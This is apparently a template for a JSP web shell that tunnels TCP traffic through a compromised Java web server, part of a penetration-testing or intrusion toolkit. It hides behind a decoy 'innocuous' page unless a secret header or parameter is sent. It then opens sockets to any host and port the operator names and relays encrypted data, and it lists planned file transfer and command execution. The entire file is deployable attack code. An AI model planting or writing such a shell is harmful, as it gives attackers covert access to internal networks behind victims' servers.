<%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!

final public static char[] hexArray = "0123456789ABCDEF".toCharArray();

class SessionConnection
{
	public String ConnectionID;
	public int PortNumber;
	public String Host;
	public Socket Sock;
	public int UnusedIterations;
	public byte[] ReceiveBuffer;
	
	public SessionConnection()
	{
		ConnectionID = GenerateConnectionID();
		PortNumber = -1;
		Host = "";
		UnusedIterations = 0;
		ReceiveBuffer = new byte[0];
	}
	
	public void AddBytesToReceiveBuffer(byte[] newBytes)
	{
		if (newBytes.length > 0)
		{
			byte[] newReceiveBuffer = new byte[ReceiveBuffer.length + newBytes.length];
			System.arraycopy(ReceiveBuffer, 0, newReceiveBuffer, 0, ReceiveBuffer.length);
			System.arraycopy(newBytes, 0, newReceiveBuffer, ReceiveBuffer.length, newBytes.length);
			ReceiveBuffer = newReceiveBuffer;
		}
	}
	
	public byte[] GetBytesFromReceiveBuffer(int maxBytes)
	{
		int byteCount = maxBytes;
		if (byteCount > ReceiveBuffer.length)
		{
			byteCount = ReceiveBuffer.length;
		}
		byte[] result = new byte[byteCount];
		
		System.arraycopy(ReceiveBuffer, 0, result, 0, byteCount);
		
		if (byteCount == ReceiveBuffer.length)
		{
			ReceiveBuffer = new byte[0];
		}
		else
		{
			int newByteCount = ReceiveBuffer.length - byteCount;
			byte[] newReceiveBuffer = new byte[newByteCount];
			System.arraycopy(ReceiveBuffer, byteCount, newReceiveBuffer, 0, newByteCount);
			ReceiveBuffer = newReceiveBuffer;
		}
		return result;
	}
	
	public String GenerateConnectionID()
	{	
		Random r = new Random();		
		byte[] connID = new byte[8];
		
		r.nextBytes(connID);
		
		return bytesToHex(connID);
	}
	
	public String bytesToHex(byte[] bytes)
	{
		char[] hexChars = new char[bytes.length * 2];
		for ( int j = 0; j < bytes.length; j++ )
		{
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = hexArray[v >>> 4];
			hexChars[j * 2 + 1] = hexArray[v & 0x0F];
		}
		return new String(hexChars);
	}
}

public byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i+1), 16));
    }
    return data;
}

public byte[] GenerateRandomBytes(int byteCount)
{
	byte[] result = new byte[byteCount];
	new Random().nextBytes(result);
	return result;
}

public byte[] EncryptData(byte[] plaintext, Cipher cipher, byte[] key) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
{
	byte[] nonce = new byte[12];
	SecureRandom secureRandom = new SecureRandom();
	secureRandom.nextBytes(nonce);
	GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);

	SecretKey secretKey = new SecretKeySpec(key, 0, key.length, "AES");
	cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmParameterSpec);

	byte[] ciphertext = cipher.doFinal(plaintext);

	// We need to sent nonce + data
	byte[] data = new byte[ciphertext.length + (96 / Byte.SIZE)];
	System.arraycopy(nonce, 0, data, 0, (96 / Byte.SIZE));
	System.arraycopy(ciphertext, 0, data, (96 / Byte.SIZE), ciphertext.length);

	return data;
}

public byte[] DecryptData(byte[] ciphertext, Cipher cipher, byte[] key) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
{
	// We need to extract the nonce from data
	byte[] nonce = new byte[12];
	System.arraycopy(ciphertext, 0, nonce, 0, (96 / Byte.SIZE));
	GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);

	byte[] data = new byte[ciphertext.length - (96 / Byte.SIZE)];
	System.arraycopy(ciphertext, (96 / Byte.SIZE), data, 0, ciphertext.length - (96 / Byte.SIZE));

	SecretKey secretKey = new SecretKeySpec(key, 0, key.length, "AES");
	cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmParameterSpec);

	byte[] decryptedText = cipher.doFinal(data);

	return decryptedText;
}
%>

<%
/* Begin configurable options */

int serverSocketMaxUnusedIterations = |PLACEHOLDER_serverSocketMaxUnusedIterations|;

int serverSocketIOTimeout = |PLACEHOLDER_serverSocketIOTimeout|;
int serverSocketSendBufferSize = |PLACEHOLDER_serverSocketSendBufferSize|;
int serverSocketReceiveBufferSize = |PLACEHOLDER_serverSocketReceiveBufferSize|;

int serverToClientBlockSize = |PLACEHOLDER_serverToClientBlockSize|;

String headerValueKey = "|PLACEHOLDER_headerValueKey|";
String encryptionKeyHex = "|PLACEHOLDER_encryptionKeyHex|";

String headerNameKey = "|PLACEHOLDER_headerNameKey|";

String accessKeyMode = "|PLACEHOLDER_accessKeyMode|";
String paramNameAccessKey = "|PLACEHOLDER_paramNameAccessKey|";

String paramNameOperation = "|PLACEHOLDER_paramNameOperation|";
String paramNameDestinationHost = "|PLACEHOLDER_paramNameDestinationHost|";
String paramNameDestinationPort = "|PLACEHOLDER_paramNameDestinationPort|";
String paramNameConnectionID = "|PLACEHOLDER_paramNameConnectionID|";
String paramNameData = "|PLACEHOLDER_paramNameData|";
String paramNamePlaintextBlock = "|PLACEHOLDER_paramNamePlaintextBlock|";
String paramNameEncryptedBlock = "|PLACEHOLDER_paramNameEncryptedBlock|";

String dataBlockNameValueSeparatorB64 = "|PLACEHOLDER_dataBlockNameValueSeparatorB64|";
String dataBlockParamSeparatorB64 = "|PLACEHOLDER_dataBlockParamSeparatorB64|";

String opModeStringOpenConnection = "|PLACEHOLDER_opModeStringOpenConnection|";
String opModeStringSendReceive = "|PLACEHOLDER_opModeStringSendReceive|";
String opModeStringCloseConnection = "|PLACEHOLDER_opModeStringCloseConnection|";

String responseStringHide = "|PLACEHOLDER_responseStringHide|";
String responseStringConnectionCreated = "|PLACEHOLDER_responseStringConnectionCreated|";
String responseStringConnectionClosed = "|PLACEHOLDER_responseStringConnectionClosed|";
String responseStringData = "|PLACEHOLDER_responseStringData|";
String responseStringNoData = "|PLACEHOLDER_responseStringNoData|";
String responseStringErrorGeneric = "|PLACEHOLDER_responseStringErrorGeneric|";
String responseStringErrorInvalidRequest = "|PLACEHOLDER_responseStringErrorInvalidRequest|";
String responseStringErrorConnectionNotFound = "|PLACEHOLDER_responseStringErrorConnectionNotFound|";
String responseStringErrorConnectionOpenFailed = "|PLACEHOLDER_responseStringErrorConnectionOpenFailed|";
String responseStringErrorConnectionCloseFailed = "|PLACEHOLDER_responseStringErrorConnectionCloseFailed|";
String responseStringErrorConnectionSendFailed = "|PLACEHOLDER_responseStringErrorConnectionSendFailed|";
String responseStringErrorConnectionReceiveFailed = "|PLACEHOLDER_responseStringErrorConnectionReceiveFailed|";
String responseStringErrorDecryptFailed = "|PLACEHOLDER_responseStringErrorDecryptFailed|";
String responseStringErrorEncryptFailed = "|PLACEHOLDER_responseStringErrorEncryptFailed|";
String responseStringErrorEncryptionNotSupported = "|PLACEHOLDER_responseStringErrorEncryptionNotSupported|";
String responseStringPrefixB64 = "|PLACEHOLDER_responseStringPrefixB64|";
String responseStringSuffixB64 = "|PLACEHOLDER_responseStringSuffixB64|";

/* End configurable options */

BASE64Decoder base64decoder = new BASE64Decoder(); 

String responseStringPrefix = new String(base64decoder.decodeBuffer(responseStringPrefixB64));
String responseStringSuffix = new String(base64decoder.decodeBuffer(responseStringSuffixB64));

String dataBlockNameValueSeparator = new String(base64decoder.decodeBuffer(dataBlockNameValueSeparatorB64));
String dataBlockParamSeparator = new String(base64decoder.decodeBuffer(dataBlockParamSeparatorB64));

int OPMODE_HIDE = 0;
int OPMODE_DEFAULT = 1;
int OPMODE_OPEN = 2;
int OPMODE_SEND_RECEIVE = 4;
int OPMODE_CLOSE = 8;
/* To do: file upload/download, OS command execution */
int OPMODE_UPLOAD = 16;
int OPMODE_DOWNLOAD = 32;
int OPMODE_CMD_EXEC = 64;

int opMode = OPMODE_HIDE;

int encryptionBlockSize = 16;

byte[] encryptionKey = new byte[] {};

try {
	encryptionKey = hexStringToByteArray(encryptionKeyHex);
} catch (Exception ex) {
	encryptionKey = new byte[] {};
}

Cipher cipher = null;

try {
	cipher = Cipher.getInstance("AES/GCM/NoPadding");
} catch (Exception ex) {
	cipher = null;
}

try {
	if (accessKeyMode.equals("header")) {
		if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim())) {
			opMode = OPMODE_DEFAULT;
		}
	}
	else {
		if (request.getParameter(paramNameAccessKey).toString().trim().equals(headerValueKey.trim())) {
			opMode = OPMODE_DEFAULT;
		}
	}
} catch (Exception ex) {
    opMode = OPMODE_HIDE;
}
%><%=responseStringPrefix%><%
if (opMode == OPMODE_HIDE) {
	/* Begin: replace this block of code with alternate JSP code to use a different "innocuous" default response */
	/* E.g. copy/paste from your favourite server status page JSP */
    %><%=responseStringHide%><%
	/* End: replace this block of code with alternate JSP code to use a different "innocuous" default response */
}
if (opMode != OPMODE_HIDE) {
	PageContext context;
	HttpSession currentSession;
	int DestPort = -1;
	String RequestedOp = "";
	String DestHost = "";
	String DataB64 = "";
	String ConnectionID = "";
	Hashtable Connections = new Hashtable();
	SessionConnection Conn = new SessionConnection();
	boolean encryptedRequest = false;
	String unpackedBlock = "";
	Hashtable unpackedParams = new Hashtable();
	boolean sentResponse = false;
	
	boolean validRequest = true;
	
	try {
		if ((request.getParameter(paramNameEncryptedBlock) != null) || (request.getParameter(paramNamePlaintextBlock) != null)) {
			byte[] decodedBytes = new byte[0];
			if ((request.getParameter(paramNameEncryptedBlock) != null) && (cipher != null) && (encryptionKey.length > 0)) {
				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNameEncryptedBlock));
				try {
					byte[] decryptedBytes = DecryptData(decodedBytes, cipher, encryptionKey);
					unpackedBlock = new String(decryptedBytes, "UTF-8");
					encryptedRequest = true;
				} catch (Exception ex) {
					%><%=responseStringErrorDecryptFailed%><%
					validRequest = false;
					sentResponse = true;
				}
			}
			else {
				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNamePlaintextBlock));
				unpackedBlock = new String(decodedBytes, "UTF-8");
			}
			
			if (validRequest) {
				String[] paramArray = unpackedBlock.split(dataBlockParamSeparator);
				if (paramArray.length > 0) {
					for (int i = 0; i < paramArray.length; i++) {
						String currentParam = paramArray[i];
						String[] pvArray = currentParam.split(dataBlockNameValueSeparator);
						if (pvArray.length > 1) {
							unpackedParams.put(pvArray[0], pvArray[1]);
						}
					}
				}
			}
		}
	} catch (Exception ex) {
		validRequest = false;
	}
	
	if (validRequest) {		
		try {
			if (unpackedParams.containsKey(paramNameOperation)) {
				RequestedOp = (String)unpackedParams.get(paramNameOperation);
			}
		} catch (Exception ex) {
			RequestedOp = "";
		}
		
		try {
			if (unpackedParams.containsKey(paramNameDestinationHost)) {
				DestHost = (String)unpackedParams.get(paramNameDestinationHost);
			}
		} catch (Exception ex) {
			DestHost = "";
		}

		try {
			if (unpackedParams.containsKey(paramNameConnectionID)) {
				ConnectionID = (String)unpackedParams.get(paramNameConnectionID);
			}
		} catch (Exception ex) {
			ConnectionID = "";
		}
		
		try {
			if (unpackedParams.containsKey(paramNameDestinationPort)) {
				DestPort = (Integer.parseInt((String)unpackedParams.get(paramNameDestinationPort)));
			}
		} catch (Exception ex) {
			DestPort = -1;
		}
		
		try {
			if (unpackedParams.containsKey(paramNameData)) {
				DataB64 = (String)unpackedParams.get(paramNameData);
			}
		} catch (Exception ex) {
			DataB64 = "";
		}
		
		if (RequestedOp.equals("")) {
			validRequest = false;
		}
	}
	
	if (validRequest) {
		if (RequestedOp.equals(opModeStringOpenConnection)) {
			opMode = OPMODE_OPEN;
			if (DestHost.equals("")) {
				validRequest = false;
			}
			if (DestPort == -1) {
				validRequest = false;
			}
		}
		if (RequestedOp.equals(opModeStringSendReceive)) {
			opMode = OPMODE_SEND_RECEIVE;
			if (ConnectionID.equals("")) {
				validRequest = false;
			}
		}
		if (RequestedOp.equals(opModeStringCloseConnection)) {
			opMode = OPMODE_CLOSE;
			if (ConnectionID.equals("")) {
				validRequest = false;
			}
		}
	}
	
	if (!validRequest) {
		if (!sentResponse) {
			%><%=responseStringErrorInvalidRequest%><%
		}
	}
	else {
		try {
			Connections = (Hashtable)session.getAttribute("SessionConnections");
			if (Connections == null) {
				Connections = new Hashtable();
			}
		} catch (Exception ex) {
			Connections = new Hashtable();
		}
		
		if (opMode == OPMODE_OPEN) {
			Conn = new SessionConnection();
			Conn.Host = DestHost;
			Conn.PortNumber = DestPort;
			ConnectionID = Conn.ConnectionID;
			try {
				Conn.Sock = new Socket(DestHost, DestPort);
				Conn.Sock.setSoTimeout(serverSocketIOTimeout);
				Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
				Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
				Connections.put(ConnectionID, Conn);
				%><%=responseStringConnectionCreated%> <%=ConnectionID%><%
				sentResponse = true;
			}
			catch (Exception ex) {
				%><%=responseStringErrorConnectionOpenFailed%><%
				validRequest = false;
				sentResponse = true;
			}
		}
	}
	
	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE)) {
		if (Connections.containsKey(ConnectionID)) {
			try {
				Conn = (SessionConnection)Connections.get(ConnectionID);
				if (Conn.Sock == null) {
					validRequest = false;
					Connections.remove(ConnectionID);
				}
			} catch (Exception ex) {
				validRequest = false;
			}
		}
		else {
			validRequest = false;
		}
		
		if (!validRequest) {
			if (!sentResponse) {
				%><%=responseStringErrorConnectionNotFound%><%
				validRequest = false;
				sentResponse = true;
			}
		}
	}

	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE)) {
		InputStream is = null;
		try {
			is = Conn.Sock.getInputStream();
		} catch (Exception ex) {
			Conn.Sock = new Socket(DestHost, DestPort);
			Conn.Sock.setSoTimeout(serverSocketIOTimeout);
			Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
			Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
			is = Conn.Sock.getInputStream();
		}
		DataInputStream inStream = new DataInputStream(is);
		DataOutputStream outStream = new DataOutputStream(Conn.Sock.getOutputStream());
		
		byte[] bytesOut = base64decoder.decodeBuffer(DataB64);
		
		boolean socketStillOpen = true;
		
		try {
			outStream.write(bytesOut);
			outStream.flush();
		} catch (Exception ex) {
			socketStillOpen = false;
			opMode = OPMODE_CLOSE;
		}
		
		byte[] bytesIn = new byte[0];
		
		if (socketStillOpen) {
			byte[] buf = new byte[6553600];
			int maxReadAttempts = 65536000;
			maxReadAttempts = 1000;
			int readAttempts = 0;
			int nRead = 0;
			boolean doneReading = false;

			try {
				nRead = inStream.read(buf);
				if (nRead < 0) {
					doneReading = true;
				}
			} catch (Exception ex) {
				doneReading = true;
			}

			while (!doneReading) {
				byte[] newBytesIn = new byte[bytesIn.length + nRead];
				if (bytesIn.length > 0) {
					System.arraycopy(bytesIn, 0, newBytesIn, 0, bytesIn.length);
				}
				if (nRead > 0) {
					System.arraycopy(buf, 0, newBytesIn, bytesIn.length, nRead);
					bytesIn = newBytesIn;
				}
				try {
					nRead = inStream.read(buf);
					if (nRead < 0) {
						doneReading = true;
					}
				} catch (Exception ex) {
					doneReading = true;
				}
				readAttempts++;
				if (readAttempts > maxReadAttempts) {
					doneReading = true;
				}
			}
			
			synchronized(session) {
				Conn.AddBytesToReceiveBuffer(bytesIn);
			}
		}
		
		if (Conn.ReceiveBuffer.length > 0) {
			String OutB64 = "";
			BASE64Encoder base64encoder = new BASE64Encoder();
			byte[] toClient = new byte[0];
			synchronized(session) {
				toClient = Conn.GetBytesFromReceiveBuffer(serverToClientBlockSize);
			}
			if (encryptedRequest) {
				try {
					byte[] encryptedBytes = EncryptData(toClient, cipher, encryptionKey);
					OutB64 = base64encoder.encode(encryptedBytes);
				} catch (Exception ex) {
					%><%=responseStringErrorEncryptFailed%><%
					validRequest = false;
					sentResponse = true;
				}
			}
			else {
				OutB64 = base64encoder.encode(toClient);
			}

			if (!sentResponse) {
				%><%=responseStringData%> <%=OutB64%><%
				sentResponse = true;
			}
		}
		else {
			if (!sentResponse) {
				%><%=responseStringNoData%><%
				sentResponse = true;
			}
		}
	}
	
	if ((validRequest) && (opMode == OPMODE_CLOSE)) {
		try {
			Conn.Sock.close();
			if (!sentResponse) {
				%><%=responseStringConnectionClosed%> <%=ConnectionID%><%
				sentResponse = true;
			}
		} catch (Exception ex) {
			if (!sentResponse) {
				%><%=responseStringErrorConnectionCloseFailed%><%
				sentResponse = true;
			}
		}
	}
	
	if (validRequest) {	
		synchronized(session) {
			try {
				Connections = (Hashtable)session.getAttribute("SessionConnections");
				if (Connections == null) {
					Connections = new Hashtable();
				}
			} catch (Exception ex) {
				Connections = new Hashtable();
			}
			
			/* Update the current connection (if one exists), and remove stale connections */		
			if (!ConnectionID.equals("")) {
				Conn.UnusedIterations = 0;
				if (Connections.containsKey(ConnectionID)) {
					Connections.remove(ConnectionID);
					if (opMode != OPMODE_CLOSE) {
						Connections.put(ConnectionID, Conn);
					}
				}
				else {
					Connections.put(ConnectionID, Conn);
				}
			}
			
			Enumeration connKeys = Connections.keys();
			while (connKeys.hasMoreElements()) {
				String cid = (String)connKeys.nextElement();
				if (!cid.equals(ConnectionID)) {
					SessionConnection c = (SessionConnection)Connections.get(cid);
					Connections.remove(cid);
					c.UnusedIterations++;
					if (c.UnusedIterations < serverSocketMaxUnusedIterations) {
						Connections.put(cid, c);
					}
					else {
						try {
							c.Sock.close();
						} catch (Exception ex) {
							// do nothing
						}
					}
				}
			}
			
			session.setAttribute("SessionConnections", Connections);
		}
	}
}
%><%=responseStringSuffix%><%
%>
